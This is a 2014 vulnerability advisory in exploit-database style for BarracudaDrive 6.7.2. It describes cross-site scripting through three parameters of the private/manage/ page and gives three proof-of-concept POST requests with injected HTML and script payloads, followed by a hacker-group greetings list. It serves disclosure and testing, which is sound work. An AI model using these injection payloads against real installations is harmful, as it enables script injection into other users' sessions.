############################################################################### 
# Exploit Title : BarracudaDrive Content Management System Multiple XSS Vulnerabilities 
# Author        : Manish Kishan Tanwar  
# Vendor        : http://barracudadrive.com 
# Software      : BarracudaDrive 6.7.2 
# Date          : 15/05/2014 
#Discovered At  : IndiShell LAB (indishell.in aka indian cyber army)
#Love to        : zero cool,Team indishell,Hardeep Singh
############################################################################## 

//////////////////////////////////// 
//  Overview of vulnerability    ///
////////////////////////////////////
BarracudaDrive Multiple Reflected and Persistent Cross-site Scripting Vulnerabilities. 

Reflected and Persistent Cross-Site Scripting vulnerabilities  in BarracudaDrive, because it does not checking user user inputs before final processing. 

 1) Input passed via the "blog" parameter to "private/manage/" is not  properly verified before it is givem to server for processing. This can be exploited to execute arbitrary HTML and script code.

 2) Input passed via the "bloggeruser" parameter to "private/manage/" is not  properly verified before it is givem to server for processing. This can be exploited to execute arbitrary HTML and script code.

 3) Input passed via the "bloggerpasswd" parameter to "private/manage/" is not  properly verified before it is givem to server for processing. This can be exploited to execute arbitrary HTML and script code.

///////////////////////////////
//   Proof of Concept: -
///////////////////////////////

1).
http://localhost/private/manage/

Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:29.0) Gecko/20100101 Firefox/29.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/private/manage/
Cookie: z9ZAqJtI=3176979a5371fd10
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 143

IsPublic=true&ShowLogin=on&GoogleAnalytics=&theme=BarracudaDriveb&blog=Blog"><h1>hi</h1>&msgrsskey=&bloggeruser=my_username&bloggerpasswd=my_password&fbkey=&fblink=Add+a+comment


2).
http://localhost/private/manage/

Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:29.0) Gecko/20100101 Firefox/29.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/private/manage/
Cookie: z9ZAqJtI=3176979a5371fd10
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 143

IsPublic=true&ShowLogin=on&GoogleAnalytics=&theme=BarracudaDriveb&blog=Blog&msgrsskey=&bloggeruser=p"><marquee>hi</marquee>&bloggerpasswd=my_password&fbkey=&fblink=Add+a+comment

3).
http://localhost/private/manage/

Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:29.0) Gecko/20100101 Firefox/29.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/private/manage/
Cookie: z9ZAqJtI=3176979a5371fd10
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 143

IsPublic=true&ShowLogin=on&GoogleAnalytics=&theme=BarracudaDriveb&blog=Blog&msgrsskey=&bloggeruser=my_username&bloggerpasswd=p"><script>alert(123);</script>&fbkey=&fblink=Add+a+comment



                             --==[[ Greetz To ]]==--
############################################################################################
#Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba, 
#Silent poison India,Magnum sniper,Atul Dwivedi ethicalnoob Indishell,Local root indishell,
#Irfninja indishell,Reborn India,L0rd Crus4d3r,cool toad,cool shavik,Hackuin,Alicks,Ebin V Thomas 
#Dinelson Amine,Th3 D3str0yer,SKSking,Mr. Trojan,rad paul,Godzila,mike waals,zoozoo,
#The creator,cyber warrior,Neo hacker ICA,Suriya Prakash, cyber gladiator,Cyber Ace, 
#Golden boy INDIA,Ketan Singh,Yash,Aneesh Dogra,AR AR,saad abbasi,hero,Minhal Mehdi ,Raj bhai ji ,
#Hacking queen,lovetherisk,brown suger and rest of TEAM INDISHELL
#############################################################################################
                             --==[[Love to]]==--
# My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,
#Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Anju Gulia,Don(Deepika kaushik) and acche bacchi(Jagriti)
                             --==[[ Special Fuck goes to ]]==--
                               <3  suriya Cyber Tyson <3


